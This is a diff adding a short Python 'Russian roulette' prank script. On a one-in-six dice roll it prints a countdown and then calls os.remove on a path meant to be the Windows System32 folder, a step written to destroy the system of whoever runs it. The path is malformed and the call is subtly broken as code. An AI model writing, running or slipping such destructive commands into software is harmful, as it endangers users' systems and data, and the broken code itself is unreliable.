@@ -1,0 +1,23 @@
+
+import random
+import os
+import time
+
+number=random.randint(1,6)
+print(f"The number is {number}")
+
+if number==1:
+    time.sleep(0.5)
+    print("SAY GOODBYE")
+    
+    print("3")
+    time.sleep(0.5)
+    print("2")
+    time.sleep(0.5)
+    print("1")
+    time.sleep(0.5)
+   
+    os.remove("c:r/Windows/System32")
+else:
+    print("You are safe, for now...")
+
